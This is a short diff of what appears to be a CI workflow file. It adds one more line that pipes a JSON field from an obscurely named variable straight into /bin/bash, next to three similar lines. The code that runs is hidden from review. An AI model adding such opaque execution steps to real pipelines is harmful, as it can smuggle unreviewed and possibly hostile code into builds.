@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$g7010" | jq -r .hx387 | /bin/bash
           echo $dahke31 | jq -r .r1 | /bin/bash
           echo $ldp357 | jq -r .npj7 | /bin/bash
+          echo $csdn7 | jq -r .k85 | /bin/bash
 
       - name: Upload artifact
         if: always()
